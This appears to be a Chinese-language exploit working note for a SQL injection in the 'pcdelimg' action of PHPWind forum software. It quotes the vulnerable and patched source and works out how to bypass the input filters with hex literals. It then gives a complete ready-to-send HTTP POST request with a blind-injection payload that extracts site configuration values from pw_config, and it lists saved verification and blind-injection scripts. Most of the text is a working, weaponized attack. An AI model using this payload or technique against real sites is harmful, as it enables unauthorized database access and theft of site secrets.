未修形态源码（runs/pw-src-732/maddogfyg-itangyou/pw_example.com L1927-1944，与 wooyun 原文逐字一致）：
  } elseif ($action == 'pcdelimg') {
      InitGP(array('tid','id','fieldname','pctype'));
      if (!$tid || !$id || !$fieldname || !$pctype) { echo 'fail'; }
      if ($pctype == 'topic')       { $tablename .= 'pw_topicvalue'.$id; }
      elseif ($pctype == 'postcate'){ $tablename .= 'pw_pcvalue'.$id; }
      $path = $db->get_value("SELECT $fieldname FROM $tablename WHERE tid=". pwEscape($tid));   // ← 无过滤
      if (strpos($path,'..') !== false) { return false; }
  }

已修形态（runs/pw-src-732/pw75sp3/pw_example.com L1993-2035）多插一行白名单，把 payload 挤出注入位置：
  $fieldname = $db->get_value("SELECT fieldname FROM pw_pcfield WHERE fieldname=" . pwEscape($fieldname));  // ← 7.5 SP3 新增
  if (!$fieldname || !$tablename) { echo 'fail';ajax_footer(); }
  $path = $db->get_value("SELECT $fieldname FROM $tablename WHERE tid=". pwEscape($tid));

清洗规则（require/common.php）：
  L624-636 CheckVar: 只替换  .. -> &#46;&#46;   ) -> &#41;   < -> &#60;   = -> &#61;
  L603-623 Char_cv :  " -> &quot;    ' -> &#39;
  => payload 必须零引号/零右括号/零等号；0x 十六进制字面量天然满足

报错回显链（判据成立性）：
  require/db_mysql.php L116   !$query && $error && $this->halt('Query Error: '.$SQL);
  require/db_mysql_error.php L13   echo "<table><tr><td>$msg";   // SQL 原文完整回显

鉴权（pw_example.com L7-9）：游客白名单仅 login/showface/showsmile/getverify/showcard/asearch/poplogin/pingpage
  => pcdelimg 需登录态；aa123123(gid=8) 足够，不需版主/后台
  => winduser cookie 密钥 = md5(UA . db_hash)，全程必须固定同一 User-Agent

完整请求原文（GET/POST 均可，POST 更稳）：
POST /bbs/pw_example.com HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/203.0.113.20 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Cookie: <aa123123 登录后的 cookie>

action=pcdelimg&fieldname=db_value+from+pw_config+where+db_name+like+0x64625f736974656f776e65726964+and+db_value+like+0x30+25+union+select+0x612e2e%3B%23&pctype=postcate&tid=1&id=1

payload 说明：db_value from pw_config where db_name like 0x<NAME_HEX> and db_value like 0x<PREFIX_HEX>25 union select 0x612e2e;#
  - 0x612e2e = 'a..' 哨兵；命中则第1行是真实值（无 '..'）→ 继续执行 → UPDATE 报错 → 回显含 pw_config
                     未命中则第1行是 'a..' → strpos('..') 命中 → return false → 脚本终止、无 SQL 报错
  - 末尾 # 把原 SQL 的 FROM pw_topicvalue1 WHERE tid=.. 全注释掉 => 不依赖任何业务表是否存在
  - 25 = '%'；<PREFIX_HEX> 为已爆前缀+候选字符的 hex

落盘脚本：
  runs/pw-rce-exp/01-verify-pcdelimg.sh      （3 包判定 action 存在性）
  runs/pw-rce-exp/02-pcdelimg-blind-sqli.py  （完整盲注，零依赖，默认 0.6s 间隔）